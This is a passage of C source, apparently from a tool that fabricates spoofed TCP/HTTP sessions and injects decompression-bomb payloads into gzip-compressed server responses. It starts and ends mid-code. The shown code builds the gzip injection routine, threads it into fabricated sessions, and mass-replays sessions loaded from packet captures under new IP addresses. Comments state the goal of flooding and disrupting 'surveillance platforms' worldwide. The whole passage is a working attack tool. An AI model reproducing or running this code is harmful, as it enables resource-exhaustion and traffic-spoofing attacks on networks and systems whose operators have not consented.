    // if its too many for this server body.. lets do it 1 less time than all characters
    if (i > data_size) i = data_size - 1;

    // lets pick random spots for gzip injection attacks
    while (i > 0) {
        n = rand() % *size;

        // make suree we didnt already mark this byte..
        if (insertions[n] == 1)
            continue;

        // mark the location where we would like to insert this attack
        insertions[n] = 1;

        i--;
    }
    
    outstream.zalloc = Z_NULL;
    outstream.zfree = Z_NULL;
    outstream.opaque = Z_NULL;

    // execute proper zlib functions for compression (to insert our attacks)
    if (deflateInit2(&outstream, Z_DEFAULT_COMPRESSION, Z_DEFLATED, 15|16, 8, Z_DEFAULT_STRATEGY) != Z_OK)
        goto end;

    // loop through the entire body finding the locations of where the injections should take place
    sptr = data;
    while (sptr < (data + data_size)) {
        // lets see how many bytes from now before we reach a location we decided to insert an attack
        // i did this just in case it would increase space if i kept the bytes going in 1, or really small..
        // i didnt care to read too far into the zlib source
        zptr = sptr;
        next_i = 0;
        while (!next_i && (zptr <= (data + data_size))) {
            y = zptr - data;
            // if this is a location then we calculate the bytes from the current pointer to it
            if (insertions[y] == 1) {
                next_i = zptr - sptr;

                break;
            }
            zptr++;
        }

        // we dont have anymore injections to insert.. so we compress the rest of the data..
        if (next_i == 0) {
            y = (data + data_size) - sptr;
        } else {
            // we have a location to insert the next at.. so we want to compress everything until that location...
            y = next_i;
        }

        // our current location...
        n = sptr - data;
        // check if we are supposed to insert here...
        if (insertions[n] == 1) {
            // set all of buf (attack buf) to the current character
            memset(buf, *sptr, options->gzip_size);

            outstream.avail_in = options->gzip_size;
            outstream.next_in = (Bytef *)buf;

            // we output it but calculate just so there are no bullshit issues later
            outstream.avail_out = (uInt)(compression_max_size - compressed_out);
            outstream.next_out = (Bytef *)(compressed + compressed_out);

            // run the zlib command so it compresses using it...
            deflate(&outstream, Z_NO_FLUSH);

            // update our information for how many bytes are located in compressed_out..
            compressed_out = outstream.total_out;

            // done this one..
            insertions[n] = 0;

            continue;
        }

        // compress data at sptr by y length
        outstream.avail_in = y;
        outstream.next_in = (Bytef *)sptr;
        outstream.avail_out = (uInt)(compression_max_size - compressed_out);
        outstream.next_out = (Bytef *)(compressed + outstream.total_out);
    
        // keep track of parameters before, and after compression so we can accurately calculate
        n = outstream.total_in;
        q = outstream.total_out;
        i = deflate(&outstream, Z_NO_FLUSH);

        // not enough buffer space.. lets realloc
        if (i == Z_BUF_ERROR) {
            compression_max_size *= 2;
            compressed_realloc = (char *)realloc((void *)compressed, compression_max_size + 1);
            
            // error couldnt allocate
            if (compressed == compressed_realloc)
                goto end;

            compressed = compressed_realloc;
        }

        y = outstream.total_in;
        r = outstream.total_out;

        // update by how many bytes went out..
        compressed_in += (y - n);
        compressed_out = outstream.total_out;

        // increase sptr by the amount of bytes
        sptr += (y - n);

        // we are done.. have to call this to complete the compression..
        if (sptr >= (data + data_size)) {
            outstream.avail_in = 0;
            deflate(&outstream, Z_FINISH);
        }
        
        compressed_out = outstream.total_out;
    }

    deflateEnd(&outstream);

    // If no data was first decompressed earlier, then we would be using the same pointer as we were first given. no need to free that..
    if (data != *server_body) PtrFree(&data);

    // free the attack buffer..
    PtrFree(&buf);

    // re-use the attack buffers pointer to merge the original header, and the compressed data together..
    // *** todo: add gzip content type to a header that wasnt originally compressed
    buf = (char *)malloc(compressed_out + header_size + 1);
    if (buf == NULL) goto end;
    memcpy(buf, *server_body, header_size);
    memcpy(buf + header_size, compressed, compressed_out);

    // free the compression buffer from whenever we built the attack
    PtrFree(&compressed);

    *server_body = buf;
    // so this doesnt get freed again below...
    buf = NULL;
    // set size for calling function to pass on for building http packets
    *size = compressed_out + header_size;


    //pthread_mutex_lock(&gzip_cache_mutex);

    // cache this gzip attack for the next X requests
    if (gzip_cache == NULL) {
        gzip_cache = (char *)malloc(*size + 1);
        if (gzip_cache != NULL) {
            memcpy(gzip_cache, *server_body, *size);
            gzip_cache_size = *size;
            gzip_cache_count = options->gzip_cache_count;

            total_gzip_count++;
        }
    }

    //printf("\rgzip injected\t\t\n");
    ret = 1;
end:;

    // free the decompression buffer.. if its still allocated (and wasnt replaced after a successful compression)
    if (ret != 1 && data && data != *server_body) PtrFree(&data);

    // free the insertion (table) we used to randomize our insertions
    PtrFree(&insertions);

    // free the attack buffer (which was used to set the current character X times so it would be compressed by that X size)
    PtrFree(&buf);

    pthread_mutex_unlock(&gzip_cache_mutex);

    return ret;
}






#ifdef TEST
// Anything below here was made intended on testing the system and dumping connections to a packet capture file..
// PCAP may be useful to have in the full blown application but im interested in fully automated personally..
// but you could just as well generate pre-timestamp scenarios and SCP/prepare boxes worldwide for attacking
// worldwide platforms.
int PtrDuplicate(char *ptr, int size, char **dest, int *dest_size) {
    char *buf = NULL;
    
    if ((ptr == NULL) || (size <= 0))
        return 0;

    if ((buf = (char *)malloc(size + 1)) == NULL)
        return -1;

    memcpy(buf, ptr, size);

    *dest = buf;
    *dest_size = size;

    return 1;
}

char *G_client_body = NULL;
char *G_server_body = NULL;
int G_client_body_size = 0;
int G_server_body_size = 0;
    


// The thread has been started to perform a GZIP attack without affecting non GZIP attack packets
void *thread_gzip_attack(void *arg) {
    int i = 0;
    GZIPDetails *dptr = (GZIPDetails *)arg;
    AS_attacks *aptr = dptr->aptr;

    //printf("locking id: %d %d %d\n", aptr->id, dptr->client_body_size, dptr->server_body_size);
    // lock mutex so AS_perform() leaves it alone for the time being
    pthread_mutex_lock(&aptr->pause_mutex);

    aptr->paused = 1;

    // GZIP Attack
    GZipAttack(aptr, &dptr->server_body_size, &dptr->server_body);
 
    // build session using the modified server body w gzip attacks
    i = BuildHTTP4Session(aptr, aptr->dst, aptr->src, aptr->destination_port, dptr->client_body, dptr->client_body_size, 
        dptr->server_body, dptr->server_body_size);
            
    // free the details that were passed to us
    PtrFree((char **)&dptr->server_body);
    PtrFree((char **)&dptr->client_body);
    

    // unpause the thread
    aptr->paused = 0;

    // set so AS_perform() will join.. just in case it causes leaks if you dont perform this..
    aptr->join = 1;

    // release mutex
    pthread_mutex_unlock(&aptr->pause_mutex);

    PtrFree((char **)&dptr);
    // exit this thread
    pthread_exit(NULL);
}



int GZIP_Thread(AS_attacks *aptr, char *client_body, int client_body_size, char *server_body, int server_body_size) {
    GZIPDetails *dptr = (GZIPDetails *)calloc(1, sizeof(GZIPDetails));
    if (dptr == NULL) return 0;

    // all details the thread will need to complete its tasks
    dptr->aptr = aptr;
    dptr->client_body = client_body;
    dptr->client_body_size = client_body_size;
    dptr->server_body = server_body;
    dptr->server_body_size = server_body_size;

    if (pthread_create(&aptr->thread, NULL, thread_gzip_attack, (void *)dptr) == 0) {
        // if we created the thread successful, then we want to pause the thread
        aptr->paused = 1;
        
        return 1;
    }
    
    // otherwise we should free that structure we just created to pass to that new thread
    PtrFree((char **)&dptr);

    return 0;
}

// this function was created as a test during genertion of the TEST mode (define TEST at top)
// it should be removed, and handled in anoother location for final version..
// its smart to keep it separate fromm AS_session_queue() so AS_session_queue() can call this, or other functions
// to fabricate sessions of different protocols
void *HTTP4_Create(AS_attacks *aptr) {
    int i = 0;
    HTTPExtraAttackParameters *eptr = NULL;
    char *server_body = NULL, *client_body = NULL;
    int server_body_size = 0, client_body_size = 0;


    // if gzip threads off.. we'd hit this code twice.. maybe use a static structure which wont need to be freed...
    if (aptr->extra_attack_parameters == NULL) {
        eptr = (HTTPExtraAttackParameters *)calloc(1, sizeof(HTTPExtraAttackParameters));
        if (eptr != NULL) {
            // parameters for gzip attack...
            // enable gzip attacks
            eptr->gzip_attack = 1;

            // percentage of sessions to perform gzip attacks on
            eptr->gzip_percentage = 10;

            // size of the gzip injection at each location it decides to insert the attack at
            eptr->gzip_size = 1024*1024 * 1;
            
            // how many injections of a GZIP attack? this is the upper range fromm 1 to this number..
            // be careful.. the amount here will exponentially increase memory usage..
            // during testing without writing to network wire.. it fills up RAM fast (waiting for pcap dumping)
            eptr->gzip_injection_rand = 5;

            // how many times to reuse the same cache before creating a new one?
            // the main variations here are between 1-100 i think.. with pthreads
            eptr->gzip_cache_count = 5000;

            // attach the extra attack parameters to this session
            aptr->extra_attack_parameters = eptr;
    
        }
    } else {
        eptr = (HTTPExtraAttackParameters *)aptr->extra_attack_parameters;
    }

    
    // verify we perform on this body
    if (eptr != NULL && eptr->gzip_attack == 1) {
        // make sure we keep it to a specific percentage
        if ((rand()%100) < eptr->gzip_percentage) {

            if (PtrDuplicate(G_server_body, G_server_body_size, &server_body, &server_body_size) &&
                PtrDuplicate(G_client_body, G_client_body_size, &client_body, &client_body_size)) {
                    // if the function paused the thread.. then we are done for now with this structure.. lets return
                    if ((GZIP_Thread(aptr, client_body, client_body_size, server_body, server_body_size) == 1) || aptr->paused) {
                        return (void *)1;
                    }
                }
        }
    }
 
    
    #ifndef BIG_TEST
        printf("client body %p size %d\nserver body %p size %d\n",G_client_body, G_client_body_size, G_server_body,
                 G_server_body_size);
    #endif

    // lets try new method    
    i = BuildHTTP4Session(aptr, aptr->dst, aptr->src, aptr->destination_port, G_client_body, G_client_body_size,
        G_server_body, G_server_body_size);

    #ifndef BIG_TEST
        printf("BuildHTTPSession() = %d\n", i);
    
        printf("Packet Count: %d\n", L_count((LINK *)aptr->packets));
    #endif

    // if the thread DIDNT start (it returns immediately if it did..) then these must be freed 
    PtrFree(&client_body);
    PtrFree(&server_body);
}
    


// dump all outgoing queued network packets to a pcap file (to be viewed/analyzed, or played directly to the Internet)
int PcapSave(char *filename, AttackOutgoingQueue *packets) {    
    AttackOutgoingQueue *ptr = packets;
    AttackOutgoingQueue *qnext = NULL;
    pcap_hdr_t hdr;
    pcaprec_hdr_t packet_hdr;
    FILE *fd;
    struct timeval tv;
    struct ether_header ethhdr;
    int ts = 0;
    int out_count = 0;

    gettimeofday(&tv, NULL);

    ts = tv.tv_sec;

    // since we are just testinng how our packet looks fromm the generator.. lets just increase usec by 1
    unsigned long usec = 0;
    char dst_mac[] = {1,2,3,4,5,6};
    char src_mac[] = {7,8,9,10,11,12};

    // zero these..
    memset((void *)&packet_hdr, 0, sizeof(pcaprec_hdr_t)); 
    memset((void *)&hdr, 0, sizeof(pcap_hdr_t));
    
    // prepare global header for the pcap file format
    hdr.magic_number = 0xa1b2c3d4;
    hdr.version_major = 2;
    hdr.version_minor = 4;
    hdr.sigfigs = 0;
    hdr.snaplen = 65535;
    hdr.network = 1;//layer = ethernet

    // set ether header (enough for wireshark, tcpdump, or whatever)
    memset(&ethhdr, 0, sizeof(struct ether_header));
    ethhdr.ether_type = ntohs(ETHERTYPE_IP);
    memcpy((void *)&ethhdr.ether_dhost, dst_mac, 6);
    memcpy((void *)&ethhdr.ether_dhost, src_mac, 6);

    // open output file
    if ((fd = fopen(filename, "wb")) == NULL) return -1;
    
    // write the global header...
    fwrite((void *)&hdr, 1, sizeof(pcap_hdr_t), fd);

    // for each packet we have in the outgoing queue.. write it to disk
    while (ptr != NULL) {

        packet_hdr.ts_sec = ts;
        packet_hdr.ts_usec += 200; 
        //packet_hdr.ts_sec = 0;
        packet_hdr.incl_len = ptr->size + sizeof(struct ether_header);
        packet_hdr.orig_len = ptr->size + sizeof(struct ether_header);

        fwrite((void *)&packet_hdr, 1, sizeof(pcaprec_hdr_t), fd);
        fwrite((void *)&ethhdr, 1, sizeof(struct ether_header), fd);
        fwrite((void *)ptr->buf, 1, ptr->size, fd);

        PtrFree(&ptr->buf);

        qnext = ptr->next;
        
        PtrFree((char **)&ptr);

        ptr = qnext;

        //if (out_count++ > 1000) break;
    }

    fclose(fd);

    return 1;

}

// put a files contents into a memory buffer
char *FileContents(char *filename, int *size) {
    FILE *fd = fopen(filename,"rb");
    char *buf = NULL;
    int i;
    struct stat stv;
    if (fd == NULL) return NULL;
    fstat(fileno(fd), &stv);
    buf = (char *)calloc(1,stv.st_size + 1);

    if (buf != NULL) {
        fread(buf,stv.st_size,1,fd);
        *size = stv.st_size;
    }

    fclose(fd);

    return buf;
}


// This was created to test this code standalone.  The final should integrate easily into other applications.
int main(int argc, char *argv[]) {
    int server_port, client_port;
    uint32_t server_ip, client_ip;
    int count = 1;
    int repeat_interval = 1;
    int i = 0, r = 0;
    int start_ts = time(0);
    FILE *fd;
    char *filename = NULL;
    AS_attacks *aptr = NULL;
#ifdef BIG_TEST
    int repeat = 1000000;
#endif
    if (argc == 1) {
        bad_syntax:;
        printf("%s ipv4_client_ip client_port ipv4_server_ip server_port client_body_file server_body_file repeat_count repeat_interval\n",
            argv[0]);
        exit(-1);
    } else if (argc == 2) {
        filename = argv[1];
        printf("Will load attacks from pcap %s\n", filename);
        
    }

    srand(time(0));

    // initialize a few things for gzip threading
    gzip_init();

    // initialize mutex for network queue...
    //pthread_mutex_init(&network_queue_mutex, NULL);

    // start network queue thread
    /*if (pthread_create(&network_thread, NULL, thread_network_flush, (void *)NULL) != 0) {
        printf("couldnt start network thread\n");
    }*/

    if (filename == NULL) {
    // client information
    client_ip       = inet_addr(argv[1]);
    client_port     = atoi(argv[2]);

    // server information
    server_ip       = inet_addr(argv[3]);
    server_port     = atoi(argv[4]);

    // client request data (in a file)
    G_client_body   = FileContents(argv[5], &G_client_body_size);
    // server responsse data (in a file)
    G_server_body   = FileContents(argv[6], &G_server_body_size);
    
#ifdef GZIPTEST
    // lets test gzip
    GZipAttack(0,&G_server_body_size, &G_server_body, 1024*1024*100, 50);

    // lets write to output...
    fd = fopen("test.gz","wb");
    if (fd == NULL) {
        printf("couldnt open output file.. maybe some other problem witth gzip\n");
        exit(-1);
    }
    fwrite((void *)G_server_body, 1, G_server_body_size, fd);
    fclose(fd);
    
    printf("wrote gzip attack file.. done\n");
    exit(-1);
#endif

    // how maany times to repeat this session on the internet?
    // it will randomize source port, etc for each..
    count           = atoi(argv[7]);
    // how many seconds in between each request?
    // this is because its expecting to handling tens of thousands simul from each machine
    // millions depending on how much of an area the box will cover for disruption of the surveillance platforms
    repeat_interval = atoi(argv[8]);

    if (!client_ip || !server_ip || !client_port || !server_port || !G_client_body ||
             !G_server_body || !count || !repeat_interval) goto bad_syntax;
    } else {
        //AS_attacks *PCAPtoAttack(char *filename, int dest_port, int count, int interval);
        //aptr = 
        i = PCAPtoAttack(filename, 80, 999999, 10);
        printf("Total from PCAP(80) : %d\n", i);
        //i = PCAPtoAttack(filename, 443, 999999, 10); printf("Total from PCAP(443): %d\n", i);
    }


#ifdef BIG_TEST
    while (repeat--) {
        server_ip = rand()%0xFFFFFFFF;
        client_ip = rand()%0xFFFFFFFF;
#endif
        if (!filename)
        // Initialize an attack structure regarding passed information
        if ((r = AS_session_queue(1, client_ip, server_ip, client_port, server_port, count, repeat_interval, 1,
                     (void *)&HTTP4_Create)) != 1) {
            printf("error adding session\n");
            exit(-1);
        }
        
#ifndef BIG_TEST
        if (!filename)
         printf("AS_session_queue() = %d\n", r);
#else
       // This is the main function to use which will loop, and handle things for the attacks
       r = AS_perform();

        if (repeat % 1000) {
            printf("\rCount: %05d\t\t", repeat);
             fflush(stdout);
        }
    }
    
    printf("\rDone                      \t\t\n");
#endif

#ifndef BIG_TEST
    // We loop to call this abunch of times because theres a chance all packets do not get generated
    // on the first call.  It is designed this way to handle a large amount of fabricated sessions 
    // simultaneously... since this is just a test... let's loop a few times just to be sure.
    for (i = 0; i < 3000; i++) {
        r = AS_perform();
        if (r != 1) printf("AS_perform() = %d\n", r);

        usleep(5000);
    }
#endif

    
    // how many packes are queued in the output supposed to go to the internet?
    printf("network queue: %p\n", network_queue);
    if (network_queue)
        printf("packet count ready for wire: %d\n", L_count((LINK *)network_queue));  


    printf("Gzip Count: %d\n", total_gzip_count);

    // This is probably the amount of time it'd dumping to network since its all happening simultaneously
    printf("Time before dumping packets to disk: %d seconds\n", (int)(time(0) - start_ts));

    if (!filename)
        // now lets write to pcap file.. all of those packets.. open up wireshark.
        PcapSave((char *)"output.pcap", network_queue);
    else
        PcapSave((char *)"output2.pcap", network_queue);

    printf("Time to fabricate, and dump packets to disk: %d seconds\n", (int)(time(0) - start_ts));

    //printf("sleeping.. check ram usage\n");
    //sleep(300);

    exit(0);
}
#endif

// Load an old format (not NG) packet capture into PacketInfo structures to populate information required
// to perform an attack with the connections
PacketInfo *PcapLoad(char *filename) {
    FILE *fd = NULL;
    char buf[1024];
    PacketInfo *ret = NULL, *pptr = NULL, *plast = NULL;
    pcap_hdr_t hdr;
    pcaprec_hdr_t packet_hdr;
    struct timeval tv;
    struct ether_header ethhdr;
    char *pkt_buf = NULL;
    int pkt_size = 0;

    if ((fd = fopen(filename, "rb")) == NULL) goto end;

    if (fread((void *)&hdr,1,sizeof(pcap_hdr_t), fd) != sizeof(pcap_hdr_t)) goto end;

    // pcapng format...
    if (hdr.magic_number == 0x0A0D0D0A) {
        //http://www.algissalys.com/network-security/pcap-vs-pcapng-file-information-and-conversion
        //editcap -F pcap <input-pcapng-file> <output-pcap-file>
        printf("Convert to pcap from pcapNG: http://www.algissalys.com/network-security/pcap-vs-pcapng-file-information-and-conversion\n");
        return NULL;
    }
    // check a few things w the header to ensure its processable
    if ((hdr.magic_number != 0xa1b2c3d4) || (hdr.network != 1)) {
        printf("magic fail %X on pcap file\n", hdr.magic_number);
        goto end;
    }

    while (!feof(fd)) {
        // first read the packet header..
        fread((void *)&packet_hdr, 1, sizeof(pcaprec_hdr_t), fd);

        // be sure the size is acceptable
        if (!packet_hdr.incl_len || (packet_hdr.incl_len > packet_hdr.orig_len)) break;

        // read the ether header (for type 1 w ethernet layer)
        if (fread(&ethhdr, 1, sizeof(struct ether_header), fd) != sizeof(struct ether_header)) break;
        
        // calculate size of packet.. its the size of the packet minus the ether header
        pkt_size = packet_hdr.incl_len - sizeof(struct ether_header);

        // allocate space for the packets buffer
        if ((pkt_buf = (char *)malloc(pkt_size + 1)) == NULL) break;
        
        // read the full packet into that buffer
        if (fread((void *)pkt_buf, 1, pkt_size, fd) != pkt_size) break;

        // allocate a new packetinfo structure for this
        if ((pptr = (PacketInfo *)calloc(1, sizeof(PacketInfo))) == NULL) break;

        // set parameters in that new structure for other functions to analyze the data
        pptr->buf = pkt_buf;
        pptr->size = pkt_size;

        // link in the correct order to the list that will be returned to the caller..
        //L_link_ordered((LINK **)&ret, (LINK *)pptr);

        // i was loading hundreds of millions of packets, and it was extremely slow.. so i decided to do it this way ordered..
        if (plast != NULL)
            plast->next = pptr;
        else
            ret = pptr;

        plast = pptr;
    }

    end:;
    if (fd != NULL) fclose(fd);
    
    // return any packets we may have retrieved out of that pcap to the calling function
    return ret;
}

// Process sessions from a pcap packet capture into building instructions to replicate, and massively replay
// those sessions :) BUT with new IPs, and everything else required to fuck shit up.
PacketBuildInstructions *PacketsToInstructions(PacketInfo *packets) {
    PacketBuildInstructions *ret = NULL;
    PacketBuildInstructions *list = NULL, *llast = NULL;
    PacketBuildInstructions *iptr = NULL;
    PacketInfo *pptr = NULL, *pnext = NULL;
    struct packet *p = NULL;
    int flags = 0;
    int data_size = 0;
    char *data = NULL;
    char *sptr = NULL;
    uint16_t chk = 0;
    uint16_t pkt_chk = 0;
    struct pseudo_tcp *p_tcp = NULL;
    char *checkbuf = NULL;
    int tcp_header_size = 0;
    struct in_addr src, dst;
    char src_ip[16];
    char dst_ip[16];

    pptr = packets;

    while (pptr != NULL) {
        // set structure for reading information from this packet
        p = (struct packet *)pptr->buf;

        // be sure its ipv4..
        if (p->ip.version == 4) {

            /*

            if (p->ip.protocol == IPPROTO_ICMP) {

            }

            if (p->ip.protocol == IPPROTO_UDP) {

            }

            */
            // be sure it is tcp/ip
            if (p->ip.protocol == IPPROTO_TCP) {
                flags = 0;
                if (p->tcp.syn) flags |= TCP_FLAG_SYN;
                if (p->tcp.ack) flags |= TCP_FLAG_ACK;
                if (p->tcp.psh) flags |= TCP_FLAG_PSH;
                if (p->tcp.fin) flags |= TCP_FLAG_FIN;
                if (p->tcp.rst) flags |= TCP_FLAG_RST;

                // create the base instruction for re-building this packet
                /*iptr = BuildInstructionsNew(&list, p->ip.saddr, p->ip.daddr,
                    ntohs(p->tcp.source), ntohs(p->tcp.dest), flags,
                    p->ip.ttl); */

                // Lets do this here.. so we can append it to the list using a jump pointer so its faster
                // was taking way too long loading a 4gig pcap (hundreds of millions of packets)
                if ((iptr = (PacketBuildInstructions *)calloc(1, sizeof(PacketBuildInstructions))) == NULL) goto end;
                
                iptr->type = PACKET_TYPE_TCP_4;

                if (llast == NULL) {
                    list = iptr;
                    llast = iptr;
                } else {
                    llast->next = iptr;
                    llast = iptr;
                }

                iptr->source_ip = p->ip.saddr;
                iptr->source_port = ntohs(p->tcp.source);
                    
                iptr->destination_ip = p->ip.daddr;
                iptr->destination_port = ntohs(p->tcp.dest);
                    
                iptr->flags = flags;
                iptr->ttl = p->ip.ttl;
                iptr->tcp_window_size = ntohs(p->tcp.window);

                // start OK.. until checksum.. or disqualify for other reasons
                iptr->ok = 1;

                // total size from IPv4 header
                data_size = ntohs(p->ip.tot_len);

                // subtract header size from total packet size to get data size..
                data_size -= (p->ip.ihl << 2) + (p->tcp.doff << 2);

                // allocate memory for the data
                if ((data = (char *)malloc(data_size + 1)) == NULL) goto end;

                // pointer to where the data starts in this packet being analyzed
                sptr = (char *)(pptr->buf + ((p->ip.ihl << 2) + (p->tcp.doff << 2)));

                // copy into the newly allocated buffer the tcp/ip data..
                memcpy(data, sptr, data_size);

                iptr->data = data;
                data = NULL; // so we dont free it below..
                iptr->data_size = data_size;

                //int PtrDuplicate(char *ptr, int size, char **dest, int *dest_size) {
                //PtrDuplicate(pptr->buf, pptr->size, &iptr->packet, &iptr->packet_size);
                // so we can access the full original packet again later
                iptr->packet = pptr->buf;
                pptr->buf = NULL;
                iptr->packet_size = pptr->size;
                pptr->size = 0;

                // we need to analyze a couple other parameters...
                iptr->header_identifier = ntohs(p->ip.id);
                iptr->tcp_window_size = ntohs(p->tcp.window);
                iptr->seq = ntohl(p->tcp.seq);
                iptr->ack = ntohl(p->tcp.ack_seq);

                // start checksum...
                // get tcp header size (so we know if it has options, or not)
                tcp_header_size = (p->tcp.doff << 2);
        
                // start of packet checksum verifications
                // set a temporary buffer to the packets IP header checksum
                pkt_chk = p->ip.check;
                // set packets IP checksum to 0 so we can calculate and verify here
                p->ip.check = 0;
                // calculate what it should be
                p->ip.check = (unsigned short)in_cksum((unsigned short *)&p->ip, IPHSIZE);
                // verify its OK.. if not mark this packet as bad (so we can verify how many bad/good and decide
                // on discarding or not)
                if (p->ip.check != pkt_chk) iptr->ok = 0;
                // lets put the IP header checksum back
                p->ip.check = pkt_chk;

                // now lets verify TCP header..
                // copy the packets header..
                pkt_chk = p->tcp.check;
                // set the packet header to 0 so we can calculate it like an operatinng system would
                p->tcp.check = 0;
                // it needs to be calculated with a special pseudo structure..
                checkbuf = (char *)calloc(1,sizeof(struct pseudo_tcp) + tcp_header_size + iptr->data_size);

                // code taken from ipv4 tcp packet building function
                p_tcp = (struct pseudo_tcp *)checkbuf;
                
                p_tcp->saddr 	= p->ip.saddr;
                p_tcp->daddr 	= p->ip.daddr;
                p_tcp->mbz      = 0;
                p_tcp->ptcl 	= IPPROTO_TCP;
                p_tcp->tcpl 	= htons(tcp_header_size + iptr->data_size);
        
                memcpy(&p_tcp->tcp, &p->tcp, tcp_header_size);
                memcpy(checkbuf + sizeof(struct pseudo_tcp), iptr->options, iptr->options_size);
                memcpy(checkbuf + sizeof(struct pseudo_tcp) + iptr->options_size, iptr->data, iptr->data_size);        
        
                // put the checksum into the correct location inside of the header
                p->tcp.check = (unsigned short)in_cksum((unsigned short *)checkbuf, tcp_header_size + PSEUDOTCPHSIZE + iptr->data_size + iptr->options_size);
        
                // free that buffer
                free(checkbuf);

                // TCP header verification failed
                if (p->tcp.check != pkt_chk) iptr->ok = 0;

                // put the original value back
                p->tcp.check = pkt_chk;
                // done w checksums..

                // moved other analysis to the next function which builds the attack structure
            }
            
        }

        pptr = pptr->next;
    }

    ret = list;

    //printf("end count: %d\n", L_count((LINK *)list));

    end:;

    // if something got us here without ret, and some list.. remove it
    if (ret == NULL && list != NULL)
        PacketBuildInstructionsFree(&list);

    PtrFree(&data);

    // this gets freed on calling function.. since a pointer to the pointer (to mark as freed) wasnt passed
    //PacketsFree(&packets);

    return ret;
}



void FilterPrepare(FilterInformation *fptr, int type, uint32_t value) {
    if (fptr->init != 0xAABBCCDD) {
        memset((void *)fptr, 0, sizeof(FilterInformation));
        fptr->init = 0xAABBCCDD;
    }

    // does this filter allow looking for specific packet propertieS? like SYN/ACK/PSH/RST
    if (type & FILTER_PACKET_FLAGS) {
        fptr->flags |= FILTER_PACKET_FLAGS;
        fptr->packet_flags = value;
    }

    // will it look for both sides of the connection? ie: port 80 would allow stuff from server to client as well
    if (type & FILTER_PACKET_FAMILIAR) {
        fptr->flags |= FILTER_PACKET_FAMILIAR;
    }

    // does the IP address match?
    if (type & FILTER_CLIENT_IP) {
        fptr->flags |= FILTER_CLIENT_IP;
        fptr->source_ip = value;
    }

    // does the server IP match?
    if (type & FILTER_SERVER_IP) {
        fptr->flags |= FILTER_SERVER_IP;
        fptr->destination_ip = value;
    }

    // does the server port match?
    if (type & FILTER_SERVER_PORT) {
        fptr->flags |= FILTER_SERVER_PORT;
        fptr->destination_port = value;
    }

    // does the source port (usually random on client) match?
    if (type & FILTER_CLIENT_PORT) {
        fptr->flags |= FILTER_CLIENT_PORT;
        fptr->source_port = value;
    }
}

// Filters through packets ensuring that it matches a criteria of something being looked for..
int FilterCheck(FilterInformation *fptr, PacketBuildInstructions *iptr) {
    int ret = 0;

    // if the filter is empty... its allowed
    if (fptr->flags == 0 || fptr->init != 0xAABBCCDD) return 1;

    // verify client IP
    if (fptr->flags & FILTER_CLIENT_IP)
        if (iptr->source_ip != fptr->source_ip)
            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) ||
             ((fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->destination_ip != fptr->source_ip)))
                goto end;

    // verify server IP
    if (fptr->flags & FILTER_SERVER_IP)
        if (iptr->destination_ip != fptr->destination_ip)
            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) ||
             ((fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->source_ip != fptr->destination_ip)))
                goto end;

    // verify server port (for instance www 80)
    if (fptr->flags & FILTER_SERVER_PORT)
        if (iptr->destination_port != fptr->destination_port)
            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) ||
             ((fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->source_port != fptr->destination_port)))
                goto end;
    
    // verify client source port
    if (fptr->flags & FILTER_CLIENT_PORT)
        if (iptr->source_port != fptr->source_port)
            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) ||
             ((fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->destination_port != fptr->source_port)))
                goto end;

    // looking for a specific type of packet by its flags..
    if (fptr->flags & FILTER_PACKET_FLAGS) {
        if (fptr->packet_flags & TCP_FLAG_SYN)
            if (!(iptr->flags & TCP_FLAG_SYN)) goto end;
        if (fptr->packet_flags & TCP_FLAG_ACK)
            if (!(iptr->flags & TCP_FLAG_ACK)) goto end;
        if (fptr->packet_flags & TCP_FLAG_PSH)
            if (!(iptr->flags & TCP_FLAG_PSH)) goto end;
        if (fptr->packet_flags & TCP_FLAG_FIN)
            if (!(iptr->flags & TCP_FLAG_FIN)) goto end;
        if (fptr->packet_flags & TCP_FLAG_RST)
            if (!(iptr->flags & TCP_FLAG_RST)) goto end;
    }

    ret = 1;

    end:;
    return ret;
}



// This will filter the main list of information from PacketsToInstructions() by ports, or IPs and then
// return those connections separately..
// It is loopable, and it used to load an entire PCAP in a different function.
PacketBuildInstructions *InstructionsFindConnection(PacketBuildInstructions **instructions, FilterInformation *flt) {
    PacketBuildInstructions *iptr = *instructions;
    PacketBuildInstructions *ilast = NULL, *inext = NULL;
    uint32_t src_ip=0, dst_ip=0;
    uint16_t src_port=0, dst_port=0;
    uint32_t client_base_seq = 0;
    uint32_t server_base_seq = 0;
    uint16_t chk = 0;
    uint16_t pkt_chk = 0;
    struct pseudo_tcp *p_tcp = NULL;
    char *checkbuf = NULL;
    int tcp_header_size = 0;
    PacketBuildInstructions *packets = NULL;
    PacketBuildInstructions *ret = NULL;
    FilterInformation fptr;
    /*int count = 0, ccount = 0, fcount = 0;
    struct in_addr src, dst;
    char Asrc_ip[16];
    char Adst_ip[16]; */

    //printf("InstructionsFindConnection count of incoming packets: %d\n", L_count((LINK *)iptr));

    if (flt == NULL)
        // default filter is port 80 (www) both sides of the packets...
        FilterPrepare(&fptr, FILTER_SERVER_PORT|FILTER_PACKET_FAMILIAR, 80);
    

    // enumerate all instruction packets
    while (iptr != NULL) {
        //count++;

        // no point in replaying bad checksum packets...
        if (iptr->ok != 0) {
        // make sure it matches our filter (right now hard coded for www)
            if (FilterCheck(flt ? flt : &fptr, iptr)) {
                //fcount++; // filter couont..
            
                // ***
                // a SYN packet with an ACK of 0 should be the first connecting packet
                // to start: we wiill support the first TCP/IP connection we grab from the pcap
                // there are numerous utilities to split PCAPs.. Ill come back to this later
                if (!src_ip && !dst_ip && !src_port && !dst_port) {
                    if ((iptr->flags & TCP_FLAG_SYN) && iptr->ack == 0) {
                        // grab the IP addresses, and ports from packet.. we will use as a reference to find the connection
                        src_ip = iptr->source_ip;
                        dst_ip = iptr->destination_ip;
                        src_port = iptr->source_port;
                        dst_port = iptr->destination_port;
                    }
                }

                // is it the same connection?
                if (((src_port == iptr->source_port) && (dst_port == iptr->destination_port)) ||
                    (src_port == iptr->destination_port) && (dst_port == iptr->source_port)) {
                        // if its coming from the source IP we found as an initial SYN.. its the client
                        if (iptr->source_port == src_port) {
                            //ccount++;
                            iptr->client = (iptr->source_port == src_port);
                        }

                        // get the next packets pointer..
                        inext = iptr->next;
                        
                        // remove from the list it arrived in.. so we can put into another list which only contains
